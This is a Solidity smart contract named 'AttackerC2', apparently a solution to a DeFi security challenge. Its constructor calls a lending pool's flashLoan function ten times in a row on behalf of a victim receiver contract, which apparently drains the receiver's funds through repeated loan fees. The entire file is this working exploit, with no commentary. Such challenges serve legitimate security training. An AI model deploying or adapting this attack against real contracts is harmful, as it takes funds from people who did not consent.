// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title AttackerC2
 * @author Georgi Nikolaev Georgiev
 */
contract AttackerC2 {
    using Address for address;

    constructor(address _poolAddress, address _receiverAddress) {
        for (uint256 i; i < 10; ) {
            _poolAddress.functionCall(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    _receiverAddress,
                    0
                )
            );

            unchecked {
                ++i;
            }
        }
    }
}